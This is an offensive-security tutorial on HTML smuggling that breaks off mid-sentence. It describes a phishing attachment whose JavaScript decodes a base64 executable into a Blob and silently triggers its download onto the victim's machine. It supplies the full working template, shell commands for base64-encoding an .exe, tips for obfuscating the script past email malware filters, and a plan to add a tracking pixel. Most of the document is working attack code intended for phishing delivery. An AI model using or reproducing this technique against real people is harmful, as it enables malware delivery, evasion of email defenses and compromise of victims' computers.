
* This technique basically creates a .html file which is attached into some phishing e-mail.
* One someone opens the html file, he is presented with some nice looking front page. All content is local.
* Javascript inside the document assembles the base64 encoded payload into a Blob stored in memory.
* Blob is automatically downloaded to the victims PC.
* Now the victim should click on the file to execute it.

The advantages of this technique is that javascript can be obfuscated allowing it to easily slip past e-mail malware filters.

Youtube: https://www.youtube.com/watch?v=LmAcnlQrChE
## Step by step Crafting of the template and payloads

In my scenario I am doing a kind of a business card that would automatically download some executable payload and then convince the victim to open it once downloaded.

For this we need to first construct the smuggling template that would take BASE64 binary executable and assemble it to a blow (credit to: https://github.com/0x73unflower/HackerForce/blob/main/Courses/RTO%20I/Initial%20Access/HTML%20Smuggling/index.html): 

```js
<html>
	<body>
	</body>
</html>
<script>
	/* Convert a base64-encoded string into an ArrayBuffer and return ArrayBuffer that 
	 * can be used to create Blob:
	 *   1. 'encodedData': input string containing base64-encoded bytes */
	function base64ToArray(encodedData) {
		/* atob() decodes a base64 string into a binary string where each character 
		* represents a byte (0-255) */
		var binaryData = window.atob(encodedData);

		/* Determine the length of the binary string and create a Uint8Array of the same 
		 * length to hold the byte values */
		var len = binaryData.length;
		var bytesArray = new Uint8Array(len);

		/* Iterate over the binary string and copy the character code (byte value) into 
		* the typed array */
		for (var i = 0; i < len; i++) {
			bytesArray[i] = binaryData.charCodeAt(i);
		}

		/* Return the underlying ArrayBuffer */
		return bytesArray.buffer;
	}

	/* Replace '...' with your base64-encoded payload */
	var encodedData = '...';

	/* Convert the base64 string to an ArrayBuffer using the helper above */
	var bytesArray = base64ToArray(encodedData);

	/* Create a Blob from the ArrayBuffer */
	var blobObject = new Blob([bytesArray], { type: 'application/octet-stream' });

	/* Replace '...' with your desired payload filename */
	var payloadFilename = '...';

	/* Create an invisible <a> element, attach it to the document, and use it to trigger
	 * an automatic download by setting href to an object URL and calling click() */
	var anchor = document.createElement('a');
	document.body.appendChild(anchor);
	anchor.style = 'display: none';

	/* Create a temporary object URL that points to the Blob. This URL can be used as the
	 * 'href' of an anchor to download the Blob contents */
	var url = window.URL.createObjectURL(blobObject);
	anchor.href = url;

	/* Set the filename for the download and programmatically click the anchor */
	anchor.download = payloadFilename;
	anchor.click();

	/* Clean up the object URL to free memory. Once revoked, the URL becomes invalid */
	window.URL.revokeObjectURL(url);
</script>
```

Here is how to get BASE64 out of a binary (or any other) file:

```bash 
#Kali 
cat file.exe | base64 -w 0 | xsel -ib

# Mac
cat file.exe | base64 -w 0 | pbcopy

```
**-w 0:** use line width of 0 for the output. This effectively **disables line wrapping**, causing the entire output to be printed as a single, continuous line without any line breaks
**xsel -ib:** copy to clipboard 


The avatar is also base64 encoded to prevent any outgoing connections, so need to downsize it to reduce the size:
`sips --resampleWidth 110 original_big_file.png --out avatar.png`

Encode avatar:
`base64 -i avatar.png > base64_avatar.txt`

Then you can copy paste the contents of the `base64_avatar.txt` into the main html file.

Now let's insert 1x1 tracking pixel to get notified if someone opens the html file. In case file is 

We can also implement tracking if some one clicks the download button.
